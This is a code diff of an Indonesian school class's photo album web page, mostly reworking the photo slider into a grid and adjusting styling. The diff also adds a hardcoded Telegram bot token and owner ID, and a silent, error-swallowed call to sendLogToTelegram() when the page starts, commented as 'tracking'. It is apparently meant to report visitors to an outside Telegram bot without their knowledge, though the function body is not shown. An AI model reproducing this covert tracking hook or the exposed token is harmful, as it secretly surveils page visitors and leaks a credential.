@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Album XII-I BARISTA MANSASS</title>
-    
-    <link rel="icon" type="image/png" href="https://files.catbox.moe/umo15f.png">
-    
-    <link rel="stylesheet" href="style.css">
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-</head>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Album XII-I BARISTA MANSASS</title>
+        
+        <link rel="icon" type="image/png" href="https://files.catbox.moe/umo15f.png">
+        
+        <link rel="stylesheet" href="style.css">
+        <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    </head>
 <body>
 
     <audio id="memoryAudio" loop>
@@ -24,50 +24,48 @@
 
     <div id="photo-modal" onclick="closeModal()">
         <img id="modal-img" src="" alt="Full Photo">
-        <div id="modal-caption" style="position:absolute; bottom:5%; color:white; font-size:1.2rem; text-align: center; width: 100%;"></div>
+        <div id="modal-caption" style="position:absolute; bottom:5%; color:white; font-size:1.2rem;"></div>
     </div>
 
     <div id="main-content">
-        <header style="text-align: center; margin-bottom: 2rem; position: relative; z-index: 2;">
-            <img src="https://files.catbox.moe/umo15f.png" alt="Logo" class="header-logo">
+        <header style="text-align: center; margin-bottom: 3rem; position: relative; z-index: 2;">
+            <img src="https://files.catbox.moe/umo15f.png" 
+                 alt="Logo" 
+                 style="width: 130px; 
+                        height: auto; 
+                        margin-bottom: 1.5rem; 
+                        filter: drop-shadow(0 0 20px rgba(212, 175, 55, 0.4));
+                        animation: slowFloat 3s ease-in-out infinite;">
             
             <h1>Welcome To</h1>
             <h2><span>BARISTA MANSASS</span></h2>
             <p style="margin-top: 1rem; letter-spacing: 1px;">"Satu Rasa, Sejuta Cerita di Masa SMA"</p>
         </header>
 
-        <div class="slider-wrapper">
-            <div class="slider-container" id="albumList">
-                </div>
-            
-            <div class="slider-controls">
-                <button class="control-btn" onclick="changeSlide(-1)">❮ Prev</button>
-                <div class="slide-counter"><span id="current">1</span> / <span id="total">0</span></div>
-                <button class="control-btn" onclick="changeSlide(1)">Next ❯</button>
+        <div class="album-container" id="albumList">
             </div>
-        </div>
 
-        <footer>
-            <div class="instagram-container">
-                <p>Follow Our Journey:</p>
-                <a href="https://www.instagram.com/barista_mansass?igsh=MXV1dWVpOG5xeng3bQ==" target="_blank" class="ig-button">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
-                        <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
-                        <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
-                    </svg>
-                    <span>@barista_mansass</span>
-                </a>
-            </div>
-            <div class="footer-copyright">
-                &copy; 2026 XII-I BARISTA MANSAS. <br>
-                <i>Created with Heart for Eternal Memories.</i>
-            </div>
-        </footer>
+            <footer>
+                <div class="instagram-container">
+                    <p>Follow Our Journey:</p>
+                    <a href="https://www.instagram.com/barista_mansass?igsh=MXV1dWVpOG5xeng3bQ==" target="_blank" class="ig-button">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+                            <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+                            <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+                        </svg>
+                        <span>@barista_mansass</span>
+                    </a>
+                </div>
+                <div class="footer-copyright">
+                    &copy; 2026 XII-I BARISTA MANSAS. <br>
+                    <i>Created with Heart for Eternal Memories.</i>
+                </div>
+            </footer>
     </div>
 
     <script>
-        // Data Foto
+        // Data Foto (Gunakan Array Anda)
         const photoLinks = [
             "3to45k.jpg", "p2m0i8.jpg", "seaqg5.jpg", "4udwl8.jpg", "7mgco8.jpg", "dlckdp.jpg", 
             "ic800w.jpg", "nm38tv.jpg", "9983h2.jpg", "hk5gf7.jpg", "n12yrb.jpg", "ta5osh.jpg", 
@@ -82,39 +80,34 @@
             "i902lw.jpg", "9xr2oj.jpg", "0epcbr.jpg", "csuo1l.jpg"
         ];
 
-        let currentIdx = 0;
+        // Konfigurasi Owner (Tetap sama)
+        const TELEGRAM_TOKEN = '8526195679:AAH--icxmjSatH2vj3AIbUDC-5mw6bwH6i0';
+        const OWNER_ID = '358455215';
+
+        // Render Album
         const albumList = document.getElementById('albumList');
-        document.getElementById('total').innerText = photoLinks.length;
 
-        // Render Slide Album
-        photoLinks.forEach((link, index) => {
-            const div = document.createElement('div');
-            div.className = `polaroid-slide ${index === 0 ? 'active' : ''}`;
-            
-            // Penyesuaian khusus Wali Kelas pada index 0
-            let captionText = (index === 0) ? "Wali Kelas XII-I" : `Momen #${index + 1}`;
-            if (index === 0) div.classList.add('wali-kelas');
+photoLinks.forEach((link, index) => {
+    const div = document.createElement('div');
+    div.className = 'polaroid';
+    
+    // Tentukan teks caption berdasarkan urutan (index)
+    // index 0 adalah foto pertama
+    let captionText = (index === 0) ? "Wali Kelas XII-I" : `Momen #${index + 1}`;
 
-            div.innerHTML = `
-                <img src="https://files.catbox.moe/${link}" loading="lazy">
-                <div class="caption">${captionText}</div>
-            `;
-            
-            div.onclick = () => openModal(div);
-            albumList.appendChild(div);
-        });
+    div.innerHTML = `
+        <img src="https://files.catbox.moe/${link}" loading="lazy">
+        <div class="caption">${captionText}</div>
+    `;
+    
+    // Opsional: Tambahkan class khusus untuk foto wali kelas agar bisa di-styling berbeda di CSS
+    if (index === 0) {
+        div.classList.add('wali-kelas');
+    }
 
-        function changeSlide(direction) {
-            const slides = document.querySelectorAll('.polaroid-slide');
-            slides[currentIdx].classList.remove('active');
-            
-            currentIdx += direction;
-            if (currentIdx >= slides.length) currentIdx = 0;
-            if (currentIdx < 0) currentIdx = slides.length - 1;
-            
-            slides[currentIdx].classList.add('active');
-            document.getElementById('current').innerText = currentIdx + 1;
-        }
+    div.onclick = () => openModal(div);
+    albumList.appendChild(div);
+});
 
         function openModal(el) {
             const modal = document.getElementById('photo-modal');
@@ -128,6 +121,7 @@
         }
 
         async function startMemories() {
+            // Animasi Transisi
             const splash = document.getElementById('splash-screen');
             const main = document.getElementById('main-content');
             
@@ -141,7 +135,11 @@
                 main.style.display = 'block';
                 setTimeout(() => main.style.opacity = '1', 100);
             }, 1000);
+
+            // Jalankan pelacakan (opsional sesuai code awal Anda)
+            try { sendLogToTelegram(); } catch(e) {}
         }
     </script>
 </body>
+
 </html>
